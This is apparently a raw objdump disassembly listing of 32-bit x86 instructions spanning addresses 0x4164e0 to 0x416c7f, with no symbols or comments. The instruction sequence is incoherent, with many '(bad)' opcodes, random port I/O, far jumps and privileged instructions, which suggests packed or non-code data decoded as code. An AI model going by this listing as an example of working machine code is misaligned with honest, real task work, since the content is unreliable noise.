  4164e0:	xor    eax,0x76834d31
  4164e5:	mov    ebx,0x4d9b343
  4164ea:	sbb    al,0x9a
  4164ec:	lea    edi,[edx]
  4164ee:	ror    DWORD PTR [eax+0x4],1
  4164f1:	pop    ecx
  4164f2:	xchg   edx,eax
  4164f3:	push   0xba18dbb5
  4164f8:	mov    gs,ebx
  4164fa:	mov    edx,0xaa2ead74
  4164ff:	stos   BYTE PTR es:[edi],al
  416500:	loop   0x41653a
  416502:	push   cs
  416503:	in     eax,dx
  416504:	jbe    0x41648d
  416506:	xchg   ebx,eax
  416507:	inc    edx
  416508:	add    ebx,ebx
  41650a:	repnz push esi
  41650c:	push   ss
  41650d:	sbb    DWORD PTR [ecx],ebx
  41650f:	sbb    ecx,eax
  416511:	xor    BYTE PTR [esi+eiz*8],cl
  416514:	pop    ss
  416515:	push   ss
  416516:	fcomp  st(3)
  416518:	fninit 
  41651a:	out    0x8d,al
  41651c:	imul   DWORD PTR [eax-0xac354aa]
  416522:	aam    0x65
  416524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416525:	addr16 addr16 xchg ecx,eax
  416528:	and    al,0x5
  41652a:	(bad)  [esi+0x4c1a3669]
  416530:	dec    esi
  416531:	dec    edi
  416532:	mov    ds:0x63c30ac8,eax
  416537:	mov    ds:0x52eeeeec,eax
  41653c:	lods   eax,DWORD PTR ds:[esi]
  41653d:	(bad)  
  41653e:	mov    edi,0xb3c5f813
  416543:	out    dx,al
  416544:	out    0x10,eax
  416546:	jge    0x4164cc
  416548:	shl    BYTE PTR cs:[ebx-0x7c],0xab
  41654d:	iret   
  41654e:	mov    ebp,0x62a593f0
  416553:	jno    0x416577
  416555:	popf   
  416556:	dec    esi
  416557:	xchg   ecx,eax
  416558:	leave  
  416559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41655a:	sub    DWORD PTR [edi+ebx*1],ebx
  41655d:	push   ecx
  41655e:	scas   eax,DWORD PTR es:[edi]
  41655f:	xlat   BYTE PTR ds:[ebx]
  416560:	adc    DWORD PTR [edx],eax
  416562:	shr    cl,cl
  416564:	or     al,0x9d
  416566:	dec    esi
  416567:	pop    ss
  416568:	and    DWORD PTR [ecx-0x1c],ecx
  41656b:	jb     0x4165a6
  41656d:	mov    ds:0x96590c66,al
  416572:	leave  
  416573:	(bad)  
  416574:	or     al,0xd3
  416576:	push   0xffffffb7
  416578:	pop    eax
  416579:	pop    esi
  41657a:	pop    esi
  41657b:	mov    ds:0x51415a72,al
  416580:	xor    eax,0xd127a7a6
  416585:	and    esp,DWORD PTR [esi]
  416587:	xchg   ebx,eax
  416588:	adc    edx,DWORD PTR [ebx+0x5631e3c4]
  41658e:	xlat   BYTE PTR ds:[ebx]
  41658f:	out    dx,eax
  416590:	jno    0x416589
  416592:	into   
  416593:	pop    ebp
  416594:	call   0x2249:0xa89116cd
  41659b:	xchg   ecx,eax
  41659c:	shl    BYTE PTR [ebp+0x61],0x76
  4165a0:	jbe    0x416528
  4165a2:	pop    edx
  4165a3:	mov    ds:0x2acacac9,eax
  4165a8:	cmp    edi,DWORD PTR [ebx+0x36bb74bb]
  4165ae:	cdq    
  4165af:	pop    esp
  4165b0:	push   ss
  4165b1:	pop    ebp
  4165b2:	rcr    DWORD PTR [ecx+0x64609f18],cl
  4165b8:	cmp    bh,cl
  4165ba:	in     eax,dx
  4165bb:	(bad)  [edi+0x59]
  4165be:	pop    edx
  4165bf:	pop    edx
  4165c0:	out    0xa4,al
  4165c2:	js     0x416586
  4165c4:	aam    0xd4
  4165c6:	and    al,0x53
  4165c8:	xchg   ebx,eax
  4165c9:	xchg   ebx,eax
  4165ca:	(bad)
  4165ce:	mov    BYTE PTR [esi-0x57],0x54
  4165d2:	sub    ch,BYTE PTR [edi+ebp*4+0x208422ae]
  4165d9:	popf   
  4165da:	dec    ecx
  4165db:	arpl   WORD PTR [ebx+0x36],bx
  4165de:	dec    ebx
  4165df:	dec    ebx
  4165e0:	ja     0x41660a
  4165e2:	sbb    al,0x1f
  4165e4:	xchg   ebx,eax
  4165e5:	pop    ds
  4165e6:	push   ds
  4165e7:	and    DWORD PTR [edi],esi
  4165e9:	xchg   esp,eax
  4165ea:	(bad)  
  4165eb:	mov    dh,0x6d
  4165ed:	cmp    bl,BYTE PTR [ebp-0x1f5d4dca]
  4165f3:	mov    eax,0x9fd3fa6e
  4165f8:	std    
  4165f9:	into   
  4165fa:	pop    edi
  4165fb:	cli    
  4165fc:	sbb    edi,0xfffffffb
  4165ff:	popf   
  416600:	out    0x59,al
  416602:	div    DWORD PTR [ebp+0x8]
  416605:	pop    fs
  416607:	add    eax,0x47e098f0
  41660c:	inc    edi
  41660e:	lahf   
  41660f:	pop    eax
  416610:	lods   al,BYTE PTR ds:[esi]
  416611:	aaa    
  416612:	sbb    dl,BYTE PTR [edi+0x6f6c1084]
  416618:	ins    DWORD PTR es:[edi],dx
  416619:	xchg   ecx,eax
  41661a:	int    0xa6
  41661c:	leave  
  41661d:	in     eax,0xb2
  41661f:	adc    al,0xa
  416621:	inc    ebp
  416622:	sbb    al,0xc7
  416624:	gs js  0x41669f
  416627:	adc    al,0x4d
  416629:	imul   DWORD PTR [edx-0x3]
  41662c:	gs pop ecx
  41662e:	data16 jge 0x41669e
  416631:	xchg   ebp,eax
  416632:	inc    esi
  416633:	mov    ds:0x248bae0e,eax
  416638:	retf   
  416639:	inc    esp
  41663a:	or     al,0x83
  41663c:	data16 mov bl,0x85
  41663f:	jmp    0x41667b
  416641:	test   al,0x8a
  416643:	inc    edx
  416644:	es popf 
  416646:	inc    esi
  416647:	rcl    DWORD PTR [esp+ecx*2-0x2d],cl
  41664b:	hlt    
  41664c:	sub    bh,ch
  41664e:	stos   BYTE PTR es:[edi],al
  41664f:	push   ebp
  416650:	mov    dh,0x6d
  416652:	fwait
  416653:	test   ecx,edi
  416655:	cmp    DWORD PTR [edx+0x53],esi
  416658:	push   ebx
  416659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41665a:	xchg   edx,eax
  41665b:	dec    ecx
  41665c:	jb     0x4165f7
  41665e:	adc    al,0x7b
  416660:	sti    
  416661:	xchg   esp,ebp
  416663:	in     al,dx
  416664:	in     al,dx
  416665:	pusha  
  416666:	pop    ebx
  416667:	push   ss
  416668:	test   eax,0xe7f39244
  41666d:	out    0xd0,al
  41666f:	adc    al,0x2f
  416671:	sbb    esp,DWORD PTR [eax+0x46]
  416674:	or     al,0x9a
  416676:	int    0x26
  416678:	popf   
  416679:	outs   dx,BYTE PTR ds:[esi]
  41667a:	pop    es
  41667b:	ret    
  41667c:	ss jo  0x41669c
  41667f:	xchg   DWORD PTR [edx-0x53],ebx
  416682:	retf   0xc1c1
  416685:	ds xchg esi,eax
  416687:	ins    DWORD PTR es:[edi],dx
  416688:	and    DWORD PTR [ecx],ecx
  41668a:	mov    ecx,ebx
  41668c:	stc    
  41668d:	jns    0x4166a3
  41668f:	inc    ebp
  416690:	popa   
  416691:	bound  esi,QWORD PTR [edx-0x76]
  416694:	ja     0x416675
  416696:	jns    0x416633
  416698:	inc    edx
  416699:	loope  0x4166a3
  41669b:	inc    ebp
  41669c:	push   ecx
  41669d:	xchg   ecx,eax
  41669e:	fs cdq 
  4166a0:	push   0xffffffa5
  4166a2:	ret    0xeada
  4166a5:	sub    cl,cl
  4166a7:	je     0x416633
  4166a9:	xchg   ecx,eax
  4166aa:	xchg   ecx,eax
  4166ab:	push   ecx
  4166ac:	mov    cs,WORD PTR [edi]
  4166ae:	psllq  mm5,QWORD PTR [ebx]
  4166b1:	pop    ebx
  4166b2:	fwait
  4166b3:	scas   eax,DWORD PTR es:[edi]
  4166b4:	add    bh,BYTE PTR [edi+0x1dfdd679]
  4166ba:	ret    0x4843
  4166bd:	add    BYTE PTR [edi+0x7e592409],cl
  4166c3:	gs jl  0x416742
  4166c6:	xor    bh,BYTE PTR [esi+0x6e9d36c7]
  4166cc:	xchg   DWORD PTR [edx+edi*1-0x7d],ecx
  4166d0:	imul   ebx,DWORD PTR [edx-0x2df69d3c],0xa7a734a9
  4166da:	gs sub al,0xcb
  4166dd:	inc    edx
  4166de:	aad    0x34
  4166e0:	int3   
  4166e1:	dec    eax
  4166e2:	test   BYTE PTR [ebp-0x6ad5ea2b],dh
  4166e8:	push   ebx
  4166e9:	adc    BYTE PTR [edx+0x72aed76b],al
  4166ef:	icebp  
  4166f0:	loop   0x416717
  4166f2:	jmp    0xad96:0x6cd93af5
  4166f9:	fstp   QWORD PTR [ebp+0x56]
  4166fc:	push   esi
  4166fd:	(bad)  
  4166fe:	mov    bh,al
  416700:	arpl   WORD PTR [esi+ecx*2+0x4c],cx
  416704:	xor    bh,BYTE PTR [esp+edi*1]
  416707:	inc    edx
  416708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416709:	aad    0x21
  41670b:	popf   
  41670c:	int    0xd0
  41670e:	push   0x9e9f29b7
  416713:	push   edx
  416714:	sub    BYTE PTR [eax+eiz*8-0x6d1449fe],bl
  41671b:	sbb    ebx,DWORD PTR [edx]
  41671d:	mov    ds:0x8d126cd9,al
  416722:	(bad)  
  416723:	cmp    DWORD PTR [eax],edi
  416725:	sub    al,0xb0
  416727:	mov    cl,0xb1
  416729:	mov    DWORD PTR [ebx+ecx*8],ebp
  41672c:	or     al,0x8f
  41672e:	in     al,0x99
  416730:	popf   
  416731:	popf   
  416732:	inc    esi
  416733:	push   ecx
  416734:	adc    eax,0xe946c6c6
  416739:	pop    edx
  41673a:	push   ss
  41673b:	aaa    
  41673c:	fidivr WORD PTR [ebx+0x3ec1c1c1]
  416742:	stc    
  416743:	loope  0x4167a6
  416745:	pop    esi
  416746:	jl     0x416739
  416748:	ret    
  416749:	les    esp,FWORD PTR [edx+0x31]
  41674c:	ficomp DWORD PTR [ebp+0x4744462e]
  416752:	push   ebx
  416753:	xor    eax,0x6c665924
  416758:	ins    BYTE PTR es:[edi],dx
  416759:	pushf  
  41675a:	data16 mov bl,0xc1
  41675d:	repnz repnz pop ebp
  416760:	mov    ah,BYTE PTR [edi]
  416762:	daa    
  416763:	inc    esp
  416764:	dec    esp
  416765:	xchg   ebx,eax
  416766:	push   esi
  416767:	stos   DWORD PTR es:[edi],eax
  416768:	leave  
  416769:	icebp  
  41676a:	icebp  
  41676b:	adc    DWORD PTR [edx-0x6f6d80dc],ecx
  416771:	add    BYTE PTR [esi],bl
  416773:	sbb    eax,DWORD PTR [esp+eax*1-0x6dbf6710]
  41677a:	in     al,0xd7
  41677c:	and    edx,DWORD PTR [ecx]
  41677e:	xchg   ebx,eax
  41677f:	fnstcw WORD PTR [ecx+0x1f9e0439]
  416785:	scas   al,BYTE PTR es:[edi]
  416786:	test   al,0x2a
  416788:	inc    ebx
  416789:	stc    
  41678a:	cmp    al,0xb9
  41678c:	fcom   QWORD PTR [eax]
  41678e:	fcmovnu st,st(3)
  416790:	pop    ebx
  416791:	in     al,dx
  416792:	in     eax,dx
  416793:	in     al,dx
  416794:	nop
  416795:	leave  
  416796:	cwd    
  416798:	sahf   
  416799:	cdq    
  41679a:	and    eax,0x68d34a95
  41679f:	xor    al,0x50
  4167a1:	push   ebp
  4167a2:	or     eax,0x3a23d05c
  4167a7:	call   0xddd9:0xc44a92a6
  4167ae:	fucom  st(1)
  4167b0:	clc    
  4167b1:	clc    
  4167b2:	mov    bl,ah
  4167b4:	mov    ds:0x47864663,eax
  4167b9:	js     0x4167a5
  4167bb:	loop   0x4167f6
  4167bd:	shr    cl,cl
  4167bf:	xor    al,0xa9
  4167c1:	inc    esp
  4167c2:	sbb    al,0xdb
  4167c4:	mov    cl,0xf9
  4167c6:	jmp    0x6895:0x2e52ef3b
  4167cd:	ss fwait
  4167cf:	jl     0x4167b9
  4167d1:	stc    
  4167d2:	out    0x48,eax
  4167d4:	les    esp,FWORD PTR [ebx-0x4c]
  4167d7:	pop    edx
  4167d8:	ins    DWORD PTR es:[edi],dx
  4167d9:	repnz mov ecx,0x2cef372c
  4167df:	mov    cl,0xbe
  4167e1:	mov    esi,0xcd90420e
  4167e6:	gs cdq 
  4167e8:	popf   
  4167e9:	sahf   
  4167ea:	inc    esp
  4167eb:	xlat   BYTE PTR ds:[ebx]
  4167ec:	xor    eax,0xf514a952
  4167f1:	inc    esi
  4167f2:	xchg   ebx,eax
  4167f3:	jp     0x416798
  4167f5:	add    DWORD PTR [eax+0x1bd428a2],eax
  4167fb:	jne    0x41680b
  4167fd:	push   cs
  4167fe:	imul   BYTE PTR [ecx]
  416800:	adc    al,0xa
  416802:	in     al,0xf3
  416804:	ret    
  416805:	dec    esp
  416806:	iret   
  416807:	into   
  416808:	adc    cl,BYTE PTR [ebp+0x191918c7]
  41680e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41680f:	push   edx
  416810:	lods   eax,DWORD PTR ds:[esi]
  416811:	shr    BYTE PTR [edi+edx*8-0x76f732cf],1
  416818:	js     0x4167a6
  41681a:	in     eax,dx
  41681b:	lea    ecx,ds:0x4316ad5a
  416821:	inc    ebx
  416822:	stc    
  416823:	dec    edi
  416824:	dec    bl
  416826:	(bad)  
  416828:	jge    0x416817
  41682a:	repz lahf 
  41682c:	cli    
  41682d:	fs out 0x8c,eax
  416830:	mov    ebx,0x121043c
  416835:	cmp    al,0x16
  416837:	clc    
  416838:	leave  
  416839:	lahf   
  41683a:	stc    
  41683b:	fstp   DWORD PTR [eax+edx*4-0x528b701c]
  416842:	ss stos BYTE PTR es:[edi],al
  416844:	lods   al,BYTE PTR ds:[esi]
  416845:	xor    BYTE PTR [ebx],dh
  416847:	xor    ecx,DWORD PTR [ebp+0x2f2c69a6]
  41684d:	sub    eax,0xb13a6861
  416852:	push   0xb071c70c
  416857:	in     al,dx
  416858:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41685a:	loop   0x416865
  41685c:	or     ecx,DWORD PTR [ebx+0x773c58e7]
  416862:	mov    ds,WORD PTR [eax+0x2c]
  416865:	inc    esi
  416866:	cs fwait
  416868:	mov    eax,ds:0xe0e15a7c
  41686d:	pusha  
  41686e:	pop    ds
  41686f:	(bad)  
  416870:	mov    dh,0x99
  416872:	cdq    
  416873:	popf   
  416874:	ror    DWORD PTR [ebp+eax*8+0x8d3a748],0x24
  41687c:	pop    esp
  41687d:	add    DWORD PTR [edi+0x72e51a95],esp
  416883:	or     DWORD PTR [ebx-0x29],edx
  416886:	jno    0x4168e4
  416888:	pop    es
  416889:	and    DWORD PTR [edx+eax*2],eax
  41688c:	adc    cl,BYTE PTR [eax-0x4e]
  41688f:	test   BYTE PTR [ebp-0x27],ch
  416892:	je     0x4168ce
  416894:	pop    ebp
  416895:	pop    edx
  416896:	int    0x16
  416898:	lods   eax,DWORD PTR ds:[esi]
  416899:	push   esi
  41689a:	sbb    ecx,DWORD PTR [ecx-0x6e]
  41689d:	push   eax
  41689e:	push   ebp
  41689f:	xchg   ebp,eax
  4168a0:	mov    BYTE PTR [ecx],bl
  4168a2:	shl    DWORD PTR [ecx+0x5c],0xe
  4168a6:	push   cs
  4168a7:	(bad)  
  4168a8:	pop    ecx
  4168a9:	pop    esi
  4168aa:	pop    ecx
  4168ab:	and    eax,0x4a934c99
  4168b0:	and    eax,0x29f97cb9
  4168b5:	mov    cs,WORD PTR [ebx]
  4168b7:	add    eax,0xe39e2dce
  4168bc:	call   0xb81cf1b9
  4168c1:	outs   dx,BYTE PTR ds:[esi]
  4168c2:	shr    DWORD PTR [eax+0x13c789d7],1
  4168c8:	mov    WORD PTR [ebp+0x4c],cs
  4168cb:	push   eax
  4168cc:	scas   eax,DWORD PTR es:[edi]
  4168cd:	xlat   BYTE PTR ds:[ebx]
  4168ce:	push   0x1b341a36
  4168d3:	or     eax,0x11617e6
  4168d8:	mov    DWORD PTR [ecx+0x278a0989],esi
  4168de:	inc    ebp
  4168df:	mov    ds:0x63a318b1,al
  4168e4:	arpl   bx,si
  4168e6:	out    dx,eax
  4168e7:	mov    esi,0xc0f3def7
  4168ec:	push   edi
  4168ed:	into   
  4168ee:	mov    eax,0x121043db
  4168f3:	shl    BYTE PTR [ebx-0x7f],0xd3
  4168f7:	jb     0x4168f2
  4168f9:	test   DWORD PTR [esi+ebp*2+0x68],esi
  4168fd:	mov    eax,0x75b068d9
  416902:	js     0x416944
  416904:	cs xchg edi,eax
  416906:	es aas 
  416908:	xor    al,0x44
  41690a:	lods   eax,DWORD PTR ds:[esi]
  41690b:	pop    edx
  41690c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41690d:	cs stos BYTE PTR es:[edi],al
  41690f:	in     al,dx
  416910:	in     eax,dx
  416911:	in     eax,dx
  416912:	xor    bh,BYTE PTR [edx]
  416914:	ss inc esi
  416916:	stos   DWORD PTR es:[edi],eax
  416917:	aad    0x44
  416919:	xchg   ecx,eax
  41691a:	adc    eax,0x76976eac
  41691f:	mov    ebx,0xc469a68d
  416924:	jecxz  0x416957
  416926:	cmp    bl,BYTE PTR [ebp+0x142852e]
  41692c:	pop    esp
  41692d:	xchg   edi,eax
  41692e:	fs sub cl,cl
  416931:	test   DWORD PTR [ebx-0x19],esi
  416934:	xor    ah,dh
  416936:	or     BYTE PTR [edx+0x3a1861a6],bl
  41693c:	out    dx,eax
  41693d:	mov    esp,0x7071efb
  416942:	sti    
  416943:	in     al,dx
  416944:	in     eax,dx
  416945:	out    dx,eax
  416946:	jae    0x41693d
  416948:	cdq    
  416949:	sub    edi,DWORD PTR [ebx+edi*8]
  41694c:	in     al,dx
  41694d:	xor    eax,0x988e0e0e
  416952:	pushf  
  416953:	sbb    BYTE PTR [edi-0x48dd5b0],ah
  416959:	(bad)  
  41695a:	sub    eax,0xf336ad9a
  41695f:	repz repz int3 
  416962:	int    0xce
  416964:	adc    BYTE PTR [ecx],dh
  416966:	and    ch,al
  416968:	mov    edx,0xe49d2646
  41696d:	lea    ebp,[edi-0x42]
  416970:	int    0xf6
  416972:	(bad)  
  416973:	ss xchg edx,edi
  416976:	adc    DWORD PTR [edi],ebx
  416978:	(bad)  
  416979:	fsubr  DWORD PTR [ebx-0x1c]
  41697c:	jb     0x416997
  41697e:	int3   
  41697f:	push   0x463c5894
  416984:	mov    eax,ds:0x5aeac050
  416989:	inc    esp
  41698a:	arpl   WORD PTR [ecx+0x24],dx
  41698d:	dec    ecx
  41698e:	bound  edi,QWORD PTR [ebp+0x6d]
  416991:	(bad)  
  416992:	in     eax,0xbb
  416994:	ja     0x416a06
  416996:	pop    esp
  416997:	xchg   edi,eax
  416998:	sub    edx,DWORD PTR [edi-0x52]
  41699b:	xchg   edx,eax
  41699c:	dec    esp
  41699d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41699e:	cmp    DWORD PTR [edx],edi
  4169a0:	cmp    BYTE PTR [eax-0x66dac6ae],ah
  4169a6:	dec    esi
  4169a7:	jno    0x416977
  4169a9:	xor    al,0xd1
  4169ab:	xor    al,0x4d
  4169ad:	scas   al,BYTE PTR es:[edi]
  4169ae:	push   esi
  4169af:	sub    ebp,DWORD PTR [edi+0x63c01210]
  4169b5:	adc    DWORD PTR [eax-0x13fce200],0xa7fefed
  4169bf:	dec    ecx
  4169c0:	ror    DWORD PTR [eax+ebp*8+0x766ddbb4],0x76
  4169c8:	mov    dh,0x49
  4169ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169cb:	shl    BYTE PTR [ebx+esi*4+0x59],cl
  4169cf:	mov    ah,BYTE PTR [edi]
  4169d1:	daa    
  4169d2:	mov    eax,0x9d2a4bae
  4169d7:	inc    esi
  4169d8:	xchg   esi,eax
  4169d9:	adc    eax,0x82f1122
  4169de:	mov    eax,0x7a8774b4
  4169e3:	lods   eax,DWORD PTR ds:[esi]
  4169e4:	dec    esi
  4169e5:	mov    ebx,0x4f1922d3
  4169ea:	xchg   edx,eax
  4169eb:	int    0x65
  4169ed:	imul   edx,esp,0x41bae8eb
  4169f3:	mov    ds:0x6ad9a4d9,eax
  4169f8:	and    ch,BYTE PTR [ebx]
  4169fa:	adc    cl,BYTE PTR [edx+0x74e9d26c]
  416a00:	mov    al,0xba
  416a02:	pop    esi
  416a03:	inc    ecx
  416a04:	(bad)  
  416a05:	scas   al,BYTE PTR es:[edi]
  416a06:	test   eax,0x6d818698
  416a0b:	mov    ebx,0x6a319324
  416a10:	mov    ch,0x3a
  416a12:	mov    ch,0x5a
  416a14:	sbb    eax,0xedd2eacb
  416a19:	je     0x416a4b
  416a1b:	or     eax,0x8a2c589d
  416a20:	and    al,0x4
  416a22:	mov    fs,ebx
  416a24:	loop   0x416a20
  416a26:	dec    ebx
  416a27:	push   es
  416a28:	(bad)  
  416a29:	bound  esi,QWORD PTR [ecx+0x1a]
  416a2c:	int    0x26
  416a2e:	inc    edi
  416a2f:	inc    edi
  416a30:	(bad)  
  416a31:	ins    BYTE PTR es:[edi],dx
  416a32:	outs   dx,BYTE PTR ds:[esi]
  416a33:	ins    DWORD PTR es:[edi],dx
  416a34:	xchg   ecx,eax
  416a35:	iret   
  416a36:	out    0x89,eax
  416a38:	(bad)  
  416a39:	jecxz  0x416a97
  416a3b:	jg     0x416a2b
  416a3d:	cmp    DWORD PTR [ecx+ebx*2],esp
  416a40:	data16 cmp BYTE PTR [edi],bh
  416a43:	int3   
  416a44:	xlat   BYTE PTR ds:[ebx]
  416a45:	mov    esi,0x952a15fe
  416a4a:	xor    bl,BYTE PTR [edx-0x26945eea]
  416a50:	push   esp
  416a51:	dec    edx
  416a52:	inc    ebp
  416a53:	out    dx,al
  416a54:	fdivr  QWORD PTR [esi-0x30c1af3b]
  416a5a:	in     al,0xd4
  416a5c:	xor    al,0x3b
  416a5e:	cmp    edi,DWORD PTR [ebx]
  416a60:	sbb    al,0x1d
  416a62:	sbb    al,0xa0
  416a64:	jmp    0x416a2c
  416a66:	out    0x80,eax
  416a68:	pop    ds
  416a69:	aas    
  416a6a:	jmp    0x416aea
  416a6c:	movups XMMWORD PTR [esi+0x5f1ccf01],xmm4
  416a73:	clc    
  416a74:	loop   0x416a45
  416a76:	imul   eax,DWORD PTR [edi+0x47],0xffffffc7
  416a7a:	pop    edi
  416a7b:	mov    BYTE PTR [ebp-0x33],al
  416a7e:	fdiv   st(0),st
  416a80:	les    esp,FWORD PTR [ebp*8-0x2f3cf48a]
  416a87:	pop    ecx
  416a88:	pop    eax
  416a89:	cmp    bh,cl
  416a8b:	rcl    al,1
  416a8d:	adc    BYTE PTR [esi+0x4a952519],ah
  416a93:	shr    DWORD PTR [esi+esi*1+0x28],cl
  416a97:	xchg   edi,eax
  416a98:	dec    edx
  416a99:	inc    esp
  416a9a:	and    ah,BYTE PTR [esi]
  416a9c:	xchg   BYTE PTR [ecx-0x50],ah
  416a9f:	mov    bl,0xbd
  416aa1:	dec    ebp
  416aa2:	mov    bl,0xd1
  416aa4:	les    esi,FWORD PTR [esi-0x19e8e993]
  416aaa:	mov    ebp,0x8674a022
  416aaf:	cld    
  416ab0:	push   eax
  416ab1:	mov    cs,WORD PTR [ebp+0x7dde6dad]
  416ab7:	idiv   DWORD PTR ds:0x440b8f8e
  416abd:	int3   
  416abe:	sub    BYTE PTR [ebx-0x49a73cdd],ah
  416ac4:	int    0xf4
  416ac6:	hlt    
  416ac7:	adc    al,0x92
  416ac9:	and    al,0xb3
  416acb:	mov    dh,0x7e
  416acd:	(bad)  
  416ace:	cmc    
  416acf:	jnp    0x416abc
  416ad1:	mov    eax,0x51a3442e
  416ad6:	adc    al,0x45
  416ad8:	and    DWORD PTR [edx],ebx
  416ada:	mov    esi,DWORD PTR [ecx]
  416adc:	xor    eax,0xa151c939
  416ae1:	shr    BYTE PTR [ebp+0x3fd9b75b],0x3c
  416ae8:	inc    eax
  416ae9:	ror    DWORD PTR [esi+eax*2],cl
  416aec:	mov    DWORD PTR [esi+0x30],0x178b934d
  416af3:	into   
  416af4:	and    ecx,DWORD PTR [ecx+0x32]
  416af7:	(bad)  
  416af9:	out    0x37,al
  416afb:	cmp    DWORD PTR [esi],edi
  416afd:	ds (bad) 
  416aff:	mov    dl,0x2c
  416b01:	cs cmp eax,0xd3551975
  416b07:	adc    BYTE PTR [edx-0x20],al
  416b0a:	mov    edx,0x954ab52e
  416b0f:	inc    esi
  416b10:	mov    ds:0x2fcdcce,eax
  416b15:	xchg   edx,eax
  416b16:	sub    al,0xb8
  416b18:	jne    0x416afd
  416b1a:	push   es
  416b1b:	xchg   ebp,eax
  416b1c:	push   0xffffff85
  416b1e:	pop    eax
  416b1f:	xor    al,0x4e
  416b21:	xor    al,0x1a
  416b23:	jecxz  0x416b13
  416b25:	in     eax,dx
  416b26:	pop    ebx
  416b27:	xchg   esp,eax
  416b28:	retf   
  416b29:	and    eax,0xfa44b162
  416b2e:	rcr    DWORD PTR [edi-0x1c80287],cl
  416b34:	fistp  QWORD PTR [edi-0x3]
  416b37:	fcmovnb st,st(5)
  416b39:	mov    bl,0xee
  416b3b:	dec    DWORD PTR [edi]
  416b3d:	cmp    al,BYTE PTR [edx+0xb]
  416b40:	loopne 0x416ace
  416b42:	xor    DWORD PTR [ebx+ecx*8+0x53a74d5d],edx
  416b49:	repz shr DWORD PTR [eax+0x23972649],1
  416b50:	push   0x6a
  416b52:	inc    esp
  416b53:	mov    ds:0x2ab56a31,eax
  416b58:	shr    DWORD PTR [eax+0x20992249],1
  416b5e:	fwait
  416b5f:	sbb    esp,edx
  416b61:	(bad)  
  416b63:	sub    bl,BYTE PTR [ebx-0x65]
  416b66:	sbb    ebx,DWORD PTR [esi+ebx*4+0x5f9b9996]
  416b6d:	pusha  
  416b6e:	bound  esp,QWORD PTR [edx-0x76]
  416b71:	popf   
  416b72:	in     eax,dx
  416b73:	dec    ebp
  416b74:	shr    cl,cl
  416b76:	xor    al,0x8d
  416b78:	adc    bp,WORD PTR [ebx-0x21c69c95]
  416b7f:	inc    edx
  416b80:	sbb    eax,0x769b76ed
  416b85:	mov    ebx,0xc8db6d83
  416b8a:	inc    edx
  416b8b:	xor    BYTE PTR [edx],bh
  416b8d:	xchg   edx,eax
  416b8e:	inc    edi
  416b8f:	xlat   BYTE PTR ds:[ebx]
  416b90:	or     eax,0xcd38c952
  416b95:	inc    esi
  416b96:	xchg   ebx,eax
  416b97:	outs   dx,DWORD PTR ds:[esi]
  416b98:	out    dx,al
  416b99:	in     eax,dx
  416b9a:	shr    DWORD PTR [eax+0x76d1d9d7],1
  416ba0:	cdq    
  416ba1:	fwait
  416ba2:	popf   
  416ba3:	and    DWORD PTR [esi],edx
  416ba5:	xor    eax,0x322d7769
  416baa:	leave  
  416bab:	sub    BYTE PTR [edi-0x21],ch
  416bae:	cmp    BYTE PTR [esi+0x12405270],ah
  416bb4:	add    BYTE PTR [ebp+0x738639f9],0x59
  416bbb:	(bad)  
  416bbd:	push   cs
  416bbe:	stos   BYTE PTR es:[edi],al
  416bbf:	stos   BYTE PTR es:[edi],al
  416bc0:	(bad)  
  416bc1:	fld    TBYTE PTR [ebp-0x74]
  416bc4:	dec    eax
  416bc5:	test   BYTE PTR [esi-0x4d],dl
  416bc8:	inc    ebp
  416bc9:	xor    bl,BYTE PTR [ecx-0x7080809c]
  416bcf:	in     eax,dx
  416bd0:	lods   eax,DWORD PTR ds:[esi]
  416bd1:	sub    eax,0x984e4e4e
  416bd6:	sahf   
  416bd7:	cdq    
  416bd8:	arpl   cx,si
  416bda:	ret    0x5279
  416bdd:	(bad)  [ecx+ebp*4]
  416be0:	sub    BYTE PTR fs:[edx-0x4b],0x8a
  416be5:	jmp    0x416ba1
  416be7:	(bad)
  416beb:	cdq    
  416bec:	sub    al,0x9b
  416bee:	sbb    esi,edi
  416bf0:	test   al,0x56
  416bf2:	sub    ch,BYTE PTR [eax-0x46]
  416bf5:	into   
  416bf6:	imul   edi,DWORD PTR [ecx-0x11528ce4],0x59eac02b
  416c00:	idiv   edi
  416c02:	pop    es
  416c03:	sbb    eax,0x319c0121
  416c08:	push   esi
  416c09:	push   esi
  416c0a:	push   esi
  416c0b:	ds sahf 
  416c0d:	iret   
  416c0e:	(bad)  
  416c10:	fldcw  WORD PTR [esi+edx*4-0x16]
  416c14:	imul   ecx,DWORD PTR [ecx-0x2735d388],0x4eed04d8
  416c1e:	fwait
  416c1f:	in     eax,0xa5
  416c21:	mov    ebx,0x3de1ba68
  416c26:	aam    0x43
  416c28:	xchg   esi,eax
  416c29:	push   eax
  416c2a:	push   esp
  416c2b:	xchg   ebp,eax
  416c2c:	jp     0x416beb
  416c2e:	mov    fs,WORD PTR [ecx+0x4747a4eb]
  416c34:	mov    ebp,eax
  416c36:	arpl   WORD PTR [ebx+edx*8+0x12c5ca29],sp
  416c3d:	dec    ebx
  416c3e:	sub    ebp,DWORD PTR [ebx]
  416c40:	enter  0xd042,0x6e
  416c44:	ja     0x416c5e
  416c46:	sbb    esi,ecx
  416c48:	push   ebx
  416c49:	stos   DWORD PTR es:[edi],eax
  416c4a:	aad    0x51
  416c4c:	push   esp
  416c4d:	adc    eax,0xeeeec484
  416c52:	add    DWORD PTR [ebx+0x3b],ebx
  416c55:	cmp    ecx,DWORD PTR [esi+ecx*4+0x1a18628c]
  416c5c:	fldcw  WORD PTR [esi+eax*1-0x25]
  416c60:	mov    dh,0x49
  416c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c63:	rcl    BYTE PTR [ebx+ecx*8+0x12e58a15],cl
  416c6a:	aad    0x4a
  416c6c:	adc    eax,0x588a6a6b
  416c71:	xor    al,0x4a
  416c73:	cs xchg edi,eax
  416c75:	repz retf 0x558b
  416c79:	(bad)  
  416c7a:	in     eax,0xd5
  416c7c:	jne    0x416c14
  416c7e:	push   edi
  416c7f:	push   edi
